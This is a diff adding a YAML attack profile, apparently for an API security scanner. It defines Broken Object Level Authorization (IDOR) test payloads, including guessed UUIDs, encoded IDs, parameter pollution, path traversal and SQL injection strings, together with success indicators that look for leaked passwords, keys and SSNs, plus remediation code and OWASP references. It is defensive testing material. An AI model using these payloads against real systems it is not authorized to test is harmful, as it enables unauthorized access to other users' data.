@@ -1,0 +1,200 @@
+# BOLA - Broken Object Level Authorization (Advanced IDOR) Attack Profile
+# This file defines advanced payloads for testing BOLA and complex IDOR vulnerabilities
+
+name: "BOLA - Broken Object Level Authorization"
+category: "access-control"
+severity: "critical"
+description: >
+  Tests for advanced Broken Object Level Authorization (BOLA/IDOR) vulnerabilities,
+  including UUID manipulation, encrypted ID bypass, multi-parameter authorization issues,
+  and privilege escalation scenarios.
+
+# Fields commonly vulnerable to BOLA
+target_fields:
+  - "id"
+  - "user_id"
+  - "userId"
+  - "account_id"
+  - "accountId"
+  - "uuid"
+  - "guid"
+  - "uid"
+  - "object_id"
+  - "objectId"
+  - "resource_id"
+  - "pid"
+  - "gid"
+  - "token"
+  - "hash"
+  - "signature"
+  - "api_key"
+  - "access_token"
+
+# Attack payloads to test
+payloads:
+  # --- UUID/GUID Manipulation ---
+  # Nil/Empty UUID
+  - "00000000-0000-0000-0000-000000000000"
+  # Sequential-ish UUIDs (often used in testing/predictable generators)
+  - "00000000-0000-0000-0000-000000000001"
+  - "00000000-0000-0000-0000-000000000002"
+  - "11111111-1111-1111-1111-111111111111"
+  - "22222222-2222-2222-2222-222222222222"
+  # Version 1 UUIDs (time-based) - attempt to guess previous/next
+  # Requires knowing a valid V1 UUID to be effective, but these are generic placeholders
+  - "a8098c1a-f86e-11da-bd1a-00112444be1e"
+  # Common test UUIDs
+  - "123e4567-e89b-12d3-a456-426614174000"
+  - "ffffffff-ffff-ffff-ffff-ffffffffffff"
+
+  # --- Encrypted/Obfuscated ID Bypass ---
+  # Base64 encoded integers (Common obfuscation)
+  - "MQ=="      # 1
+  - "Mg=="      # 2
+  - "MTA="      # 10
+  - "MTAw"      # 100
+  - "MA=="      # 0
+  # Base64 encoded JSON (JWT-like or complex ID)
+  - "eyJpZCI6MX0="          # {"id":1}
+  - "eyJpZCI6Mn0="          # {"id":2}
+  - "eyJ1c2VyX2lkIjoxfQ=="  # {"user_id":1}
+  - "eyJ1c2VySWQiOjF9"      # {"userId":1}
+  # Hex encoded
+  - "31"        # 1
+  - "32"        # 2
+  - "3130"      # 10
+  # Hash collisions / Common hashes (MD5)
+  - "c4ca4238a0b923820dcc509a6f75849b" # 1
+  - "c81e728d9d4c2f636f067f89cc14862c" # 2
+  - "eccbc87e4b5ce2fe28308fd9f2a7baf3" # 3
+
+  # --- Multi-parameter BOLA / HPP ---
+  # HTTP Parameter Pollution (HPP) - Injecting same parameter twice
+  - "1&id=2"
+  - "1&user_id=2"
+  # Type Juggling / Format Confusion
+  - "1.0"
+  - "1"
+  - "[1]"
+  - "{\"id\": 1}"
+  - "true" # Boolean true sometimes resolves to admin/1
+  # Array wrapping
+  - "id[]=1"
+  - "id[]=2"
+
+  # --- Role-based BOLA / Privilege Escalation ---
+  # Vertical Privilege Escalation (Admin IDs)
+  - "0"         # Often admin/system
+  - "1"         # Often admin
+  - "-1"        # Integer overflow / internal test account
+  - "admin"
+  - "administrator"
+  - "system"
+  - "root"
+  - "superuser"
+  # Horizontal Privilege Escalation (Peer Access)
+  - "1001"      # Typical starting user ID
+  - "1002"
+  - "2000"
+  - "9999"
+
+  # --- Path Traversal / ID context manipulation ---
+  - "../1"
+  - "/1"
+  - "1/../2"
+  - "%2e%2e%2f1"
+  - "me/../1"
+  - "users/1"   # API path confusion
+
+  # --- Database-Specific ID Injection ---
+  # MongoDB / NoSQL
+  - "507f1f77bcf86cd799439011" # Valid ObjectId structure
+  - "000000000000000000000000" # Null ObjectId
+  # SQL Injection via ID
+  - "1' OR '1'='1"
+  - "1 OR 1=1"
+  - "1; --"
+
+# Indicators that suggest successful BOLA exploitation
+success_indicators:
+  response_contains:
+    - "admin"
+    - "root"
+    - "system"
+    - "password"
+    - "apiKey"
+    - "api_key"
+    - "access_token"
+    - "private_key"
+    - "secret"
+    - "config"
+    - "balance"
+    - "credit_card"
+    - "ssn"
+    - "social_security"
+    - "unauthorized access to" # Some verbose errors leak info
+  status_codes:
+    - 200 # OK - Success
+    - 201 # Created
+    - 202 # Accepted
+  response_differs_from:
+    - "original_request"
+  absence_of:
+    - "error"
+    - "denied"
+    - "forbidden"
+    - "unauthorized"
+    - "401"
+    - "403"
+
+# How to fix this vulnerability
+remediation: |
+  Implement robust Object Level Authorization checks for EVERY access to a resource.
+
+  Strategies:
+  1. **Enforce Ownership Checks**:
+     Always verify that the `current_user` has permission to access the requested `object_id`.
+     
+     ```python
+     # Python/Flask Example
+     @app.route('/api/files/<file_id>')
+     @login_required
+     def get_file(file_id):
+         file_obj = File.query.get(file_id)
+         if not file_obj:
+             return jsonify({'error': 'Not found'}), 404
+             
+         # 🛡️ BOLA PROTECTION: Check ownership
+         if file_obj.owner_id != current_user.id and not current_user.is_admin:
+             return jsonify({'error': 'Unauthorized'}), 403
+             
+         return jsonify(file_obj.data)
+     ```
+
+  2. **Use Unguessable IDs (UUIDs)**:
+     Replace sequential integer IDs (1, 2, 3...) with Random UUIDs (v4).
+     *Note: UUIDs alone are NOT a fix for BOLA, but they make enumeration harder.*
+
+  3. **Object-Level Permissions / Policies**:
+     Use a permission model (like CASL in JS, or Cancan in Ruby) to define rules centrally.
+
+     ```javascript
+     // Node.js Example (Conceptual)
+     if (user.can('read', document)) {
+       return document;
+     } else {
+       throw new ForbiddenError();
+     }
+     ```
+
+  4. **Do Not Rely on Obfuscation**:
+     Encoding IDs in Base64 or hashing them does not prevent access if the ID can be guessed,
+     leaked, or replayed. Always valid permissions on the server.
+
+references:
+  - "https://owasp.org/www-project-api-security/2019/A1-Broken_Object_Level_Authorization"
+  - "https://cwe.mitre.org/data/definitions/639.html"
+  - "https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html"
+  - "https://auth0.com/blog/preventing-insecure-direct-object-references-idor-in-endpoints/"
+
+cat_message: "I found a secret stash of catnip meant for the big cats! 🦁 (BOLA: Accessed unauthorized resource)"
